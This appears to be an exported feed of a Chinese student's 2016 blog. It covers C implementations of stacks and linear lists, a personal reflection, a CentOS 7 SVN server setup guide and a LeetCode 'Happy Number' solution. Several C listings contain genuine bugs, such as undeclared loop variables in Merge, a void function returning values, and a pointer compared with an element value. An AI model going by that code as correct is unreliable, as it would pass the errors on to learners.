        <tag>数据结构</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构基础之栈]]></title>
    <url>%2F2016%2F09%2F07%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%E4%B9%8B%E6%A0%88%2F</url>
    <content type="text"><![CDATA[继续上一篇博客的话题，继续总结数据结构的相关知识，此篇博客主要总结栈的基本概念、存储结构、基本操作以及应用，栈是一种操作受限的线性表，只允许在表的一端进行插入和删除，也正因为它的这个特点，使得栈的应用十分广泛，比如数制转换、表达式求值等问题的解决都用到栈以及栈在递归中的重要作用。 栈的基本概念定义：只允许在表的一端进行插入和删除的操作的线性表。 栈顶：允许插入和删除的一端。 特点：后进先出（Last In First Out，LIFO）。 顺序栈 对栈顶指针进行初始化时，可以将其初始化为-1，也可以初始化为0，当初始化为-1时栈顶指针指向的元素即为栈顶元素，而初始化为0时，栈顶指针减1所指向的元素才是栈顶元素，具体区别如下： 初始化栈顶指针S-&gt;top = -1时栈顶元素为S-&gt;data[S-&gt;top] 进栈操作：先将栈顶指针加1，再送值到栈顶元素，即S-&gt;data[++S-&gt;top] = x 出栈操作：先取栈顶元素值，再将栈顶指针减1，即x = S-&gt;data[S-&gt;top–] 栈空条件：S-&gt;top = -1 栈满条件：S-&gt;top = MAXSIZE - 1 栈长：S-top + 1 初始化栈顶指针S-&gt;top = 0时栈顶元素为S-&gt;data[S-&gt;top - 1] 进栈操作：先送值到栈顶元素，栈顶指针再加1，即S-&gt;data[S-&gt;top++] = x 出栈操作：先将栈顶指针减1，再取栈顶元素值，即x = S-&gt;data[–S-&gt;top] 栈空条件：S-&gt;top = 0 栈满条件：S-&gt;top = MAXSIZE 栈长：S-top 基本操作实现下面以将栈顶指针初始化为0为例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define MAXSIZE 100 //定义栈的最大容量#define true 1#define false 0typedef struct&#123; ElemType data[MAXSIZE]; //存放栈中元素的数组 int top; //栈顶指针&#125;SeqStack;/******构造一个空栈******/void InitStack(SeqStack *S)&#123; S-&gt;top = 0; //栈顶指针初始化为0&#125;/*******判断栈空*******/int StackEmpty(SeqStack *S)&#123; if(S-&gt;top == 0) return true; else return false;&#125;/***********出栈操作***********/int Pop(SeqStack *S,ElemType *e)&#123; if(S-&gt;top == 0) //若栈空出栈失败 return false; *e = S-&gt;data[-- S-&gt;top]; //修改栈顶指针，并保存栈顶元素 return true;&#125;/***********进栈操作***********/int Push(SeqStack *S,ElemType e)&#123; if(S-&gt;top == MAXSIZE) //若栈满则进栈失败 return false; S-&gt;data[S-&gt;top ++] = e; //将e插入栈顶，并修改栈顶指针 return true;&#125;/***********取栈顶元素***********/int GetTop(SeqStack *S,ElemType *e)&#123; if(S-&gt;top == 0) //若栈空取栈顶元素失败 return false; *e = S-&gt;data[S-&gt;top-1]; //保存栈顶元素 return true;&#125;int main()&#123; SeqStack S; InitStack(&amp;S); .... 进行进栈、出栈、判断栈空等操作 ....&#125; 链栈利用单链表结构来实现的栈，即栈中的每一个数据元素用一个结点来表示，同时设置一个指针top来指示栈顶元素的当前位置。 特点 便于多个栈共享存储空间 不存在栈满溢出的情况 操作与链表类似，便于结点的插入和删除 基本操作实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define false 0#define true 1typedef struct SNode&#123; ElemType data; //数据域 struct SNode *next; //指针域&#125;SNode;typedef struct&#123; SNode *top; //栈顶指针&#125;LinkStack;/*******构造一个空栈*******/int InitStack(LinkStack *S)&#123; S = (LinkStack *)malloc(sizeof(LinkStack)); //分配栈顶指针的内存空间 if(S == NULL) //内存分配失败 return false; S-&gt;top = NULL; //栈顶指针置为空 return true;&#125;/**********置栈空**********/void ClearStack(LinkStack *S)&#123; S-&gt;top = NULL; //将栈顶指针置为空&#125;/*********判断栈空********/int StackEmpty(LinkStack *S)&#123; return S-&gt;top == NULL; //判断栈顶指针是否为空&#125;/***********进栈操作***********/int Push(LinkStack *S,ElemType e)&#123; SNode *temp; temp = (SNode *)malloc(sizeof(SNode)); //生成新的结点 if(temp == NULL) //内存分配失败 return false; temp-&gt;data = e; //赋值给结点数据域 temp-&gt;next = S-&gt;top; //插入栈顶 S-&gt;top = temp; //修改栈顶指针 return true;&#125;/***********出栈操作***********/int Pop(LinkStack *S,ElemType *e)&#123; SNode *temp; if(S-&gt;top == NULL) //若栈为空则出栈失败 return false; temp = S-&gt;top; S-&gt;top = temp-&gt;next; //修改栈顶指针 *e = temp-&gt;data; //保存栈顶元素 free(temp); //释放出栈结点 return true;&#125;/***********取栈顶元素***********/int GetTop(LinkStack *S,ElemType *e)&#123; if(S-&gt;top == NULL) //若栈为空则无法获取栈顶元素 return false; *e = S-&gt;top-&gt;data; //取栈顶指针指向的元素 return true;&#125;int main()&#123; LinkStack S; InitStack(&amp;S); .... 进行进栈、出栈、判断栈空等操作 ....&#125; 共享栈为了避免出现有的栈溢出有的栈空闲的情况，可以让多个栈共享一个足够大的数组空间，是存储空间得到充分利用。常见的是两栈共享空间，即让两个栈共享一个一维数组空间，使两个栈的栈底分别设置在共享空间的两端，两个栈顶向共享空间的中间延伸。 特点同样，由于初始化的不同会出现两种情况，这里以初始化栈1的栈顶指针为0，栈2的栈顶指针为MAXSIZE-1为例进行说明： 栈满条件：S-&gt;top1 = S-&gt;top2 + 1 栈空条件：S-&gt;top1 = 0 或 S-&gt;top2 = MAXSIZE - 1 进栈操作：栈1：先赋值栈顶指针再加1，栈2：先赋值栈顶指针再减1 出栈操作：栈1：栈顶指针先减1再赋值，栈2：栈顶指针先加1再赋值 栈顶元素：栈1：S-&gt;data[S-&gt;top1-1]，栈2：S-&gt;data[S-&gt;top2-1] 如果初始化栈1的栈顶指针为-1，栈2的栈顶指针为MAXSIZE会有什么不同呢？还是自己想一想吧，这里就不给出啦。 基本操作实现下面是初始化为0和MAXSIZE-1的情况： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define MAXSIZE 100 //定义栈的最大容量#define true 1#define false 0typedef struct&#123; ElemType data[MAXSIZE]; //两栈共享的数组空间 int top[2]; //两栈的栈顶指针&#125;DSeqStack;/*********构造一个空栈*********/void InitStack(DSeqStack *S)&#123; S-&gt;top[0] = 0; //初始化栈1的栈顶指针 S-&gt;top[1] = MAXSIZE-1; //初始化栈2的栈顶指针&#125;/*********判断栈是否为空*********/int StackEmpty(DSeqStack *S,int i)&#123; switch(i)&#123; case 1: return (S-&gt;top[0] == 0? true:false); //判断栈1是否为空 break; case 2: return (S-&gt;top[1] == MAXSIZE-1? true:false); //判断栈2是否为空 break; default: return false; //参数错误 &#125;&#125;/**************进栈操作**************/int Push(DSeqStack *S,ElemType e,int i)&#123; if(S-&gt;top[0] == S-&gt;top[1]+1) //判断栈空间是否满 return false; switch(i)&#123; case 1: S-&gt;data[S-&gt;top[0]] = e; //将e压入第1个栈 S-&gt;top[0]++; break; case 2: S-&gt;data[S-&gt;top[1]] = e; //将e压入第2个栈 S-&gt;top[1]--; break; default: return false; //参数错误 &#125; return true;&#125;/**************出栈操作**************/int Pop(DSeqStack *S,ElemType *e,int i)&#123; switch(i)&#123; case 1: if(S-&gt;top[0] == 0) //判断栈1是否为空 return false; S-&gt;top[0]--; //修改栈1的栈顶指针 *e = S-&gt;data[S-&gt;top[0]]; //从第1个栈中弹出 break; case 2: if(S-&gt;top[1] == MAXSIZE-1) //判断栈2是否为空 return false; S-&gt;top[1]++; //修改栈2的栈顶指针 *e = S-&gt;data[S-&gt;top[1]]; //从第2个栈中弹出 break; default: return false; //参数错误 &#125; return true;&#125;int main()&#123; DSeqStack S; InitStack(&amp;S); .... 进行进栈、出栈、判断栈空等操作 ....&#125; 栈的应用数制转换数制转换过程中我们得到的结果序列往往是我们所要结果的逆序，这时候就需要栈来帮忙了。比如，将十进制数12转换成二进制序列，过程如下： 12345612/2 = 6...06/2 = 3...03/2 = 1...11/2 = 0...1依次得到0011，但是12的二进制表示为1100，即为逆序。 所以我们需要将每次得到的余数压入栈中，一直到没有元素需要压入栈中时再将元素依次从栈中弹出，即得到正确的结果。 以十进制转K进制为例： 1234567891011121314void Conversion(int n,int k)&#123; ElemType x; SeqStack S; InitStack(&amp;S); while(n&gt;0)&#123; x = n%k; Push(&amp;S,x); //将得到的余数依次压入栈中 n = n/k; &#125; while(!StackEmpty(&amp;S))&#123; Pop(&amp;S,&amp;x); printf(&quot;%d&quot;,x); &#125;&#125; 栈的应用还有很多，比如括号匹配的检验、表达式求值，以及栈在递归中的重要作用。这里就不再一一描述了，以后在Leetcode上看到类似的题目再进行说明。]]></content>
      <categories>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构基础之线性表]]></title>
    <url>%2F2016%2F09%2F06%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%BA%BF%E6%80%A7%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[数据结构也是算法学习的一部分，最近比较忙，在对所学的知识查漏补缺，没有学习什么新的东西，于是干脆就对一直在复习数据结构来了个大总结，这篇博客主要是数据结构的线性表部分，争取尽快把其他部分总结完。接下来的一段时间可能不会经常去Leetcode刷题了，近期的算法学习这一系列的博客将以数据结构为主，因为近来有更重要的事情要做，毕竟精力有限，刷题这一块就先放一放咯。 线性表的基本概念定义：具有相同数据类型的n(n&gt;=0)个数据元素的有限序列 线性表的特点： 1、表中的元素个数有限。 2、表中元素具有逻辑上的顺序性，在序列中各元素排列有其先后顺序。 3、表中元素都是数据元素，每个元素都是单个元素。 4、表中元素的数据类型都相同。 5、表中元素具有抽象性。即仅讨论元素间的逻辑关系，不考虑元素究竟表示什么内容。 顺序存储顺序表线性表的顺序存储。用一组地址连续的存储单元，依次存储线性表中的数据元素，使得逻辑上相邻的两个元素在物理上也相邻。 注意：顺序表的位序是从1开始的，而数组中元素的下标是从0开始的。 基本操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define OVERFLOW -2#define true 1#define false 0#define LIST_INIT_SIZE 10 //线性表存储空间的初始分配量#define LIST_INCREMENT 2 //线性表存储空间的分配增量typedef struct&#123; ElemType *data; //存储空间基址 int length; //当前长度 int listsize; //当前分配的存储容量(以sizeof(ElemType)为单位)&#125;SeqList;/********初始化********/int InitList(SeqList *L)&#123; L-&gt;data = (ElemType *)malloc(sizeof(ElemType)*LIST_INIT_SIZE); if(!L-&gt;data) return OVERFLOW; L-&gt;length = 0; L-&gt;listsize = LIST_INIT_SIZE; return true;&#125;/****************插入操作*****************/int ListInsert(SeqList *L,int i,ElemType e)&#123; int j; if(i&lt;1||i&gt;L-&gt;length+1) //判断i的范围是否有效 return false; if(L-&gt;length == L-&gt;listsize) //存储空间已满时不能插入 return OVERFLOW; for(j=L-&gt;length;j&gt;=i;j--) //将第i个元素及之后的元素后移 L-&gt;data[j]=L-&gt;data[j-1]; L-&gt;data[i-1]=e; //在位置i处放入e L-&gt;length++; //线性表长度加1 return true;&#125;/***********删除操作***********/int ListDelete(SeqList *L,int i)&#123; int j; if(i&lt;1||i&gt;L-&gt;length+1) //判断i的范围是否有效 return false; for(j=i;j&lt;L-&gt;length;j++) //将第i个位置之后的元素前移 L-&gt;data[j-1] = L-&gt;data[j]; L-&gt;length--; //线性表长度减1 return true;&#125;/**********按位置查找************/ElemType GetElem(SeqList *L,int i)&#123; if(i&lt;1||i&gt;L-&gt;length+1) //判断i的范围是否有效 return false; return L-&gt;data[i-1];&#125;/*************按值查找**************/int LocateElem(SeqList *L,ElemType e)&#123; int i; for(i=0;i&lt;L-&gt;length;i++)&#123; if(L-&gt;data[i] == e) return i+1; &#125; return 0;&#125;/*********求表长**********/int ListLength(SeqList *L)&#123; return L-&gt;length;&#125;/******判断是否是空表*****/void ListEmpty(SeqList *L)&#123; if(L-&gt;length == 0) return true; else return false;&#125;/*********输出表*********/void printList(SeqList *L)&#123; int i; for(i=0;i&lt;L-&gt;length;i++) printf(&quot;%d &quot;,L-&gt;data[i]);&#125;/*********清空表********/void ClearList(SeqList *L)&#123; L-&gt;length = 0;&#125;/*********销毁表********/void DstroyList(SeqList *L)&#123; free(L-&gt;data); L-&gt;data = NULL; L-&gt;length = 0; L-&gt;listsize = 0;&#125;int main()&#123; SeqList L; InitList(&amp;L); .... 进行插入、删除、查找结点等操作 .... return 0;&#125; 扩展操作 1234567891011121314151617181920212223242526272829303132333435363738/********将顺序表的所有元素逆置******/void Reverse(SeqList *L)&#123; int i; ElemType temp; //辅助变量 for(i=0;i&lt;((L-&gt;length)/2);i++)&#123; //扫描顺序表L，进行元素交换 temp = L-&gt;data[i]; L-&gt;data[i] = L-&gt;data[L-&gt;length-1-i]; L-&gt;data[L-&gt;length-1-i] = temp; &#125;&#125;/******删除有序顺序表中重复的元素******/void Del_same(SeqList *L)&#123; int i,j; for(i=0,j=1;j&lt;L-&gt;length;j++)&#123; //i存储第一个不相同的元素，j工作指针 if(L-&gt;data[i] != L-&gt;data[j])&#123; //查找下一个与上一个元素值不相同的元素 L-&gt;data[++i] = L-&gt;data[j]; //找到后，则将元素前移 &#125; &#125; L-&gt;length = i+1; //删除相同元素后，线性表的长度&#125;/*****将两个有序顺序表合并成一个新的有序顺序表*****/int Merge(SeqList *L1,SeqList *L2,SeqList *L)&#123; if(L1-&gt;length + L2-&gt;length &gt; L-&gt;length) //大于合并表的长度 return false; while(i &lt; L1-&gt;length &amp;&amp; j &lt; L2-&gt;length)&#123; //循环，两两比较，较小的存入结果表 if(L1-&gt;data[i] &lt;= L2-&gt;data[j]) L-&gt;data[k++] = L1-&gt;data[i]; else L-&gt;data[k++] = L2-&gt;data[j]; &#125; while(i &lt; L1-&gt;length) //处理剩下没比完的顺序表 L-&gt;data[k++] = L1-&gt;data[i++]; while(j &lt; L2-&gt;length) L-&gt;data[k++] = L2-&gt;data[i++]; return true;&#125; 链式存储单链表单链表：通过一组任意的存储单元来存储线性表中的数据元素。 头结点head指向单链表的第一个结点。 结点由两部分组成：数据域data，指针域next(存放直接后继元素的地址)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define true 1#define false 0typedef struct LNode&#123; ElemType data; struct LNode *next;&#125;LNode,*LinkList;/************头插法建立链表*************/LinkList HeadInsert_CreatList(LinkList L)&#123; int n; LNode *s; L = (LinkList)malloc(sizeof(LNode)); //创建头结点 L-&gt;next = NULL; printf(&quot;采用头插法建立链表，请输入结点值，以9999结束：\n&quot;); scanf(&quot;%d&quot;,&amp;n); while(n!=9999)&#123; s = (LinkList *)malloc(sizeof(LNode)); //创建新结点 s-&gt;data = n; s-&gt;next = L-&gt;next; L-&gt;next = s; //将新结点插入表中 scanf(&quot;%d&quot;,&amp;n); &#125; return L;&#125;/************尾插法建立链表*************/LinkList RearInsert_CreatList(LinkList L)&#123; int n; LNode *s,*r; L = (LinkList)malloc(sizeof(LNode)); //创建头结点 r = L; printf(&quot;采用尾插法建立链表，请输入结点值，以9999结束：\n&quot;); scanf(&quot;%d&quot;,&amp;n); while(n!=9999)&#123; s = (LNode *)malloc(sizeof(LNode)); //创建新结点 s-&gt;data = n; r-&gt;next = s; r = s; //r指向新的表尾结点 scanf(&quot;%d&quot;,&amp;n); &#125; r-&gt;next = NULL; //表尾结点指针置空 return L;&#125;/*******按序号查找结点值*******/LNode* GetElem(LinkList L,int i)&#123; int j = 1; LNode *p = L-&gt;next; //头结点指针赋给p if(i==0) //i=0返回头结点 return L; if(i&lt;1) //i无效则返回NULL return NULL; while(p&amp;&amp;j&lt;i)&#123; //从第1个结点开始查找第i个结点 p = p-&gt;next; j++; &#125; return p; //返回第i个结点的指针&#125;/*************按值查找结点*************/LNode* LocateElem(LinkList L,ElemType e)&#123; LNode *p = L-&gt;next; //头结点指针赋给p while(p!=NULL&amp;&amp;p-&gt;next!=e) //从第1个结点开始查找值为e的结点 p = p-&gt;next; return p; //找到则返回值为e的结点，否则返回NULL&#125;/****************插入结点****************/int ListInsert(LinkList L,int i,ElemType x)&#123; LNode *s,*p; p = GetElem(L,i-1); //查找插入位置的前驱结点 s = (LNode *)malloc(sizeof(LNode)); //创建新结点 s-&gt;data = x; s-&gt;next = p-&gt;next; p-&gt;next = s; return true;&#125;/*********求表长*********/int ListLength(LinkList L)&#123; int len = 0; LNode *p = L-&gt;next; //头结点指针赋给p while(p)&#123; len++; //记录表中结点个数 p = p-&gt;next; &#125; return len; //返回表长&#125;/***********删除结点***********/int ListDelete(LinkList L,int i)&#123; LNode *p = GetElem(L,i-1); //查找待删除结点的前驱结点 LNode *q = p-&gt;next; //p指向需要删除的结点 p-&gt;next = q-&gt;next; //修改指针 free(q); //释放删除结点的存储空间 return true;&#125;/*****打印链表结点值******/int ListPrint(LinkList L)&#123; LNode *p = L-&gt;next; //头结点指针赋给p while(p)&#123; printf(&quot;%d &quot;,p-&gt;data); //按顺序依次输出结点值 p = p-&gt;next; &#125; printf(&quot;\n&quot;);&#125;int main()&#123; LinkList L1,L2; L1 = HeadInsert_CreatList(L1); printf(&quot;采用头插法建立的链表L1的结点值为：&quot;); ListPrint(L1); L2 = RearInsert_CreatList(L2); printf(&quot;采用尾插法建立的链表L2的结点值为：&quot;); ListPrint(L2); .... 进行插入、删除、查找结点等操作 .... return 0;&#125; 双链表每个结点设置两个指针prior和next，分别指向其前驱结点和后继结点。 1234typedef struct DNode&#123; ElemType data; //数据域 struct DNode *prior,*next; //前驱和后继指针&#125;DNode,*DLinkList; 插入操作： 12345//将结点*s插入到结点*p之后s-&gt;next = p-&gt;next;p-&gt;next-&gt;prior = s;s-&gt;prior = p;p-&gt;next = s; 删除操作：1234//删除结点*p的后继结点*qp-&gt;next = q-&gt;next;q-&gt;next-&gt;proir = p;free(q); 循环单链表将单链表的最后一个指针由NULL改为指向头结点，使整个链表形成一个环。 判空条件为：头结点的指针是否等于头结点。 插入删除与单链表相同。 静态链表借助数组来描述线性表的链式存储结构。 结点由两部分组成：数据域data，下一个元素的数组下标next。 1234typedef struct&#123; ElemType data; //存储数据元素 int next; //下一个元素的数组下标&#125;SLinkList[MAXSIZE]; 以next=-1作为其结束的标志。 顺序表和链表的比较存取方式顺序表：可以顺序存取也可以随机存取。 链表：只能从表头顺序存取元素。 逻辑结构与物理结构顺序表：逻辑上相邻的元素，其对应的物理存储位置也相邻。 链表：逻辑上相邻的元素，其物理存储位置则不一定相邻。 查找、插入和删除操作查找： 按值查找时，顺序表无序时，顺序表和链表的时间复杂度均为O(n)，但是当顺序表有序时，可采用折半查找，时间复杂度为O(log2n)。 按序号查找时，顺序表的时间复杂度仅为O(1)，而链表的平均时间复杂度为O(n)。 插入和删除： 顺序表平均需要移动半个表长的元素，而链表只需要修改相关指针即可。 空间分配顺序存储在空间分配中存在诸多问题与隐患，比如内存溢出、内存闲置等，而链式存储的结点空间只在需要的时候申请分配，只要内存有空间就可以分配，操作灵活、高效。]]></content>
      <categories>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开学季-那些迷茫与美好]]></title>
    <url>%2F2016%2F08%2F31%2F%E5%BC%80%E5%AD%A6%E5%AD%A3-%E9%82%A3%E4%BA%9B%E8%BF%B7%E8%8C%AB%E4%B8%8E%E7%BE%8E%E5%A5%BD%2F</url>
    <content type="text"><![CDATA[大学的最后一个暑假已经结束，明天就是九月了，开学已经好几天，但是根本没有任何开学的感觉，毕竟都是大四的老腊肉了。没有一节课的大四生活就这样悄悄地开始了，不知道接下来会发生什么，也不知道这一年自己可以做些什么，有时候选择很多也未必是好事，因为这样会很迷茫。就像现在的我，每天都觉得很迷茫，但是我还是按照既定的计划每天向前走着。这样的日子说不上很美好，但是却很安静，也很满足。 这个暑假，基本的安排都在有序的进行着，虽然总会有一些烦人的事情，也会有担忧，但是都还是坚持下来了。最近看了鲁豫有约之大咖一日行第一期王健林的那个视频，这些大咖总是又让我们很佩服的事情，虽然他们肯定有过人之处，就像他那句话刷爆了朋友圈的话：先定一个小目标，比方说我先挣它一个亿。我觉得确实说得很对啊，抛开大家对于一个亿是小目标的玩笑，认真想想，很多时候，我们就是缺少一个实际一点的目标。我们可以根据自己的实际情况对自己定一些小目标，然后关键就在于我们能不能坚持去做了。我也给自己定过很多小目标，有的完成了，有的没完成，但是这个过程中收获还是有的。 先定一个小目标，比方说我先写它30篇博客。暑假，在复习之余也一直在更新自己的博客，我始终认为技术不能丢，安卓和算法这是这个暑假主要在学习的两块内容。暑假写了差不多30篇博客，有时候也会很烦，写一篇博客确实需要花费很多的精力，从选题到拟定提纲、到查阅资料、编写实例，再到格式整理等等，这个过程其实是很漫长而又艰难的，有时候也会想要放弃，但是每次写完都还是很有成就感的。虽然可能自己写的博客没有多少人来看，但是这都不重要，写博客本来就是对自我学习的总结以及对自己写作能力的锻炼。 考研这条路不再像高考，高考的时候你的身边都是为了考大学这一个目标，但是现在似乎不再有以前的那种氛围，那股冲劲，身边很多人都去实习了，留下的也基本都在等秋招，自己也投了一些简历，想去试试。现在的生活真的很安静，早上早起打打球，白天静静地待在图书馆学习，晚上静静地在寝室写代码写博客，没有什么压力，也没有什么束缚，其实这样也挺好。 不管怎么说，信心还是要有的。一直以来对于自己的自学能力还是很有信心的，大学里学到的很多技术也都是靠自己查资料、实践以及向老师学长学姐请教学来的。但是也开始意识到自己薄弱的地方，慢慢懂得数据结构与算法是软件的核心，不管是考研还是找工作，数据结构与算法都是很重要的知识。虽然有些技能不需要人教我就可以很快掌握，但是在数据结构和算法方面自己还是很欠缺的。不想做一个只会写代码的底层码农，而想要成为有思想的程序员，要慢慢地朝着架构师的方向发展。 不知道九月甚至是大四的这一年会发生些什么，也不知道接下来我会怎样走下去，虽然迷茫但是从来不畏惧，相信努力、勤奋与坚持会带来改变。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于CentOS7的SVN服务器配置]]></title>
    <url>%2F2016%2F08%2F30%2F%E5%9F%BA%E4%BA%8ECentOS7%E7%9A%84SVN%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[SVN是Subversion的简称，它是一个受欢迎的开放源代码的版本控制系统。简单一点说，SVN就是用于多个人共同开发同一个项目，共用资源的目的。作为软件开发人员，很有必要了解和学习SVN的使用。学习版本控制从SVN安装与配置开始，此篇博客主要讲解基于阿里云服务器的SVN服务器配置。 版本控制版本控制系统 (VCS) 是一个软件，帮助软件开发人员团队工作并维持他们完整的工作历史。 版本控制系统(VCS) 的目标： 允许开发者们同时工作 不会重写每个人的改变 维持每个版本的全部的历史 VCS被分成两种 集中版本控制系统 (CVCS) 和 分散或不集中的版本控制系统 (DVCS) Subversion 基于集中的版本控制系统，意味着使用统一的服务器让团队协作。 安装SVN大多数 GNU/Linux 发行版系统自带，所以它很有可能已经安装在你的系统上了。可以使用下面命令检查是否安装了。 1svn --version 如果系统已经安装Subversion客户端，使用上面的命令会出现安装的软件版本，否则会提示命令找不到。 如果你使用基于RPM的GNU/Linux，可以切换到root用户使用yum命令进行安装，安装成功之后，执行 svn –version 命令。 1yum install subversion 如果你使用基于Debian的GNU/Linux，使用apt命令进行安装。 1sudo apt-get update 另外，还需要安装Apache httpd模块，如果没有安装请自行百度吧，这里主要讲解如何配置SVN。 注：博主租用的阿里云的服务器，采用CentOS系统，自带SVN，并且我已经安装好了Apache httpd模块。 创建目录保存所有的工作1mkdir -p /var/svn 创建版本库1svnadmin create /var/svn/repo 创建完成后，可以使用ls命令看到，在版本库中存在如下文件： 1conf db format hooks locks README.txt 配置版本库在conf目录下有如下三个文件： svn服务综合配置文件（svnserve.conf） 用户名口令文件（passwd） 权限配置文件（authz） 配置svnserve.conf文件找到以下四行，删除前面的注释符使其起作用： 1234anon-access = read #匿名用户可读auth-access = write #授权用户可写password-db = passwd #使用哪个文件作为账号文件authz-db = authz.conf #使用哪个文件作为权限文件 配置passwd文件在[users]块中添加用户和密码，格式：帐号=密码，例如添加如下两个账户： 123[users]fzy = 123456hunau = 111111 配置authz文件在末尾添加如下代码： 123[/]fzy = rwhunau = r 意思是版本库的根目录fzy用户对其有读写权限，hunau用户只有读权限。 启动和使用配置成功以后，使用如下命令启动svn版本库服务： 1svnserve -d -r /var/svn #其中/var/svn为版本库根目录 查看是否启动成功： 1ps -ef|grep svnserve 关闭svn服务（1）使用以下命令查找进程 1ps aux | grep svn 如下：12root 22368 1 0 Aug29 ? 00:00:00 svnserve -d -r /var/svnroot 24538 24423 0 19:58 pts/0 00:00:00 grep --color=auto svn （2）使用Kill命令杀死进程 1kill -s 9 22368 #其中22368 为进程ID Windwos上客户端安装与使用（1）下载安装SVN Windows客户端：TortoiseSVN 下载地址：https://tortoisesvn.net/downloads.html （2）新建一个文件夹用来存放版本库文件 （3）右键选择SVN Checkout （4）填写SVN地址 格式为： 1svn://服务器ip地址/服务器上版本库名称/ （5）输入用户名密码 可以勾选保存账号密码，如果你只用一个账号的话可以这么做，如果需要经常切换账户的话最好不要勾选。 如果已经勾选了，但是又需要切换账户，怎么办呢？ 右键菜单：Settings -&gt; Saved Data-&gt; Authentication data -&gt; Clear （6）在repo文件夹下进行版本控制操作 可以将服务器上的文件通过SVN Update更新到本地，也可以将本地文件通过SVN commit提交到服务器，还有很多的操作，在这里就不一一讲解了，下次写一篇详细的博客进行介绍。 注：文件上传到服务器后存放在服务器什么地方呢？ 一般放在版本库路径下的db文件夹的revs文件夹中，例如我的为/var/svn/repo/db/revs。 需要注意的地方checkout时，提示：URL svn://服务器ip地址/repo doesn’t exist…奇怪，怎么会提示库不存在呢？肯定是哪里配置问题。后来尝试了半天，也在网上搜索了很久，终于发现问题所在。 如果你的svn库的路径为：/var/svn/repo 那么你启动时，不能用命令：1svnserve -d -r /var/svn/repo 而要用命令：1svnserve -d -r /var/svn/ commit时，提示：Authorization failed问题可能出在svnserve.conf这个文件。注意以下四行一定要取消注释： 1234# anon-access = read# auth-access = write# password-db = passwd# authz-db = authz 问题也有可能出在authz文件里，用户组或者用户权限没有配置好，只要设置[/]就可以，代表根目录下所有的资源，如果要限定资源，可以加上子目录即可。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SVN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(七)]]></title>
    <url>%2F2016%2F08%2F27%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B8%83%2F</url>
    <content type="text"><![CDATA[Happy NumberLeetCode第202题 题目描述Write an algorithm to determine if a number is “happy”. A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers. Example: 19 is a happy number 1^2 + 9^2 = 82 8^2 + 2^2 = 68 6^2 + 8^2 = 100 1^2 + 0^2 + 0^2 = 1 思路分析快乐数（happy number）有以下的特性：在给定的进位制下，该数字所有数位(digits)的平方和，得到的新数再次求所有数位的平方和，如此重复进行，最终结果必为1。 如果一个数是一个happy number，那么最终是1循环，比较容易判断。如果一个数不是 happy number，那么存在一个循环，其中不包含1，这就比较难判断，因为不清楚这个循环周期大小。一种解决思路是通过HashSet来存取数字，如果这个数字之前存储好了，说明进入一个循环。利用HashSet元素不重复的性质，采用add方法，它会返回一个boolean值，如果集合中已经存在该元素返回false，否则返回true。 Java语言实现12345678910111213141516171819public class Solution &#123; public boolean isHappy(int n) &#123; Set&lt;Integer&gt; records = new HashSet&lt;Integer&gt;(); while(n!=1)&#123; if(!records.add(n)) //把结果添加到记录中，如果集合中已经存在该元素则判断为非快乐数 return false; else&#123; int sum = 0; while(n!=0)&#123; //依次得到各个位的平方数并加起来 int digit = n%10; sum = sum + digit*digit; n = n/10; &#125; n = sum; //把结果赋给n &#125; &#125; return true; &#125;&#125; 这道题目自己用C语言一直没有AC出来，于是上网找了找资料，所有不快乐数的数位平方和计算，最后都会进入4 → 16 → 37 → 58 → 89 → 145 → 42 → 20 → 4的周期性循环。那如何判断周期性循环呢？这就需要用到Floyd判圈算法的思想了： Floyd判圈算法(Floyd Cycle Detection Algorithm)，又称龟兔赛跑算法(Tortoise and Hare Algorithm)。该算法由美国科学家罗伯特·弗洛伊德发明，是一个可以在有限状态机、迭代函数或者链表上判断是否存在环，求出该环的起点与长度的算法。 初始状态下，假设已知某个起点节点为节点S。现设两个指针t和h，将它们均指向S。接着，同时让t和h往前推进，但是二者的速度不同：t每前进1步，h前进2步。只要二者都可以前进而且没有相遇，就如此保持二者的推进。当h无法前进，即到达某个没有后继的节点时，就可以确定从S出发不会遇到环。反之当t与h再次相遇时，就可以确定从S出发一定会进入某个环。 运用此思想进行解题： LeetCode 